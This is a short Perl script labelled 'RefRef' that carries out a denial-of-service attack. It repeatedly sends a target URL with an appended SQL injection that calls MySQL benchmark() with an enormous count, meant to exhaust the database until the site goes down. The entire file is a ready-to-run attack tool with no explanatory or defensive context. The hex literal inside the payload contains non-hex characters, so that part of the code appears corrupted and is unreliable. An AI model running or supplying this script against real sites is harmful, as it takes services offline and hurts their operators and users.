#!usr/bin/perl
#RefRef (C) Anonymous 2011
 
use LWP::UserAgent;
 
my $nave = LWP::UserAgent->new;
$nave->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12");
$nave->timeout(5);
 
head();
if($ARGV[0]) {
now($ARGV[0]);
} else {
sintax();
}
copyright();
 
sub now {
print "\n[+] Target : ".$_[0]."\n";
print "\n[+] Starting the attack\n[+] Info : control+c for stop attack\n\n";
while(true) {
$SIG{INT} = \&adios;
$code = toma($_[0]." and (select+benchmark(99999999999,0x70726f62614CmsVwmDJfsa7wFVp24rwqH7z4MMjZVYNe646f))");
unless($code->is_success) {
print "[+] Web Off\n";
copyright();
}}}
 
sub adios {
print "\n[+] Stoping attack\n";
copyright();
}
 
sub head {
print "\n\n-- == #RefRef == --\n\n";
}
 
sub copyright {
print "\n\n-- == RefRef == --\n\n";
exit(1);
}
 
sub sintax {
print "\n[+] Sintax : $0 \n";
}
 
sub toma {
return $nave->get($_[0]);
}
 
# &#191; The End ?